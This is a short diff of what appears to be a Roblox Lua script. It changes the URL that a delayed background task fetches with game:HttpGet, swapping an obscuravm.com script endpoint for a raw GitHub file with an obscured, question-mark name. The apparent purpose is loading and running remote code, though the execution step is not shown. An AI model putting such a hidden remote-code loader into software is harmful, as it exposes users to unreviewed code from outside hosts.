@@ -3503,7 +3503,7 @@ end)
 task.spawn(function()
     task.wait(5)
 
-    local url = "https://api.obscuravm.com/scripts/8938580627688479218"
+    local url = "https://raw.githubusercontent.com/67Studio/A/refs/heads/main/%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F"
 
     local ok, err = pcall(function()
         local source = game:HttpGet(url)
